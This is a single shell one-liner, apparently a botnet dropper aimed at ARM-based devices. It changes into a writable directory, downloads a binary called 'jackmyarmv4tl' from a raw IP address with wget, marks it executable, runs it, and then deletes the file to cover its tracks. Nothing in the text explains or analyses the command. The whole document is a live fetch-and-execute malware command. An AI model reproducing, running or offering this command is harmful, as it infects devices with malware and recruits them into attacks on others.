cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://185.142.236.238/jackmyarmv4tl; chmod +x jackmyarmv4tl; ./jackmyarmv4tl; rm -rf jackmyarmv4tl
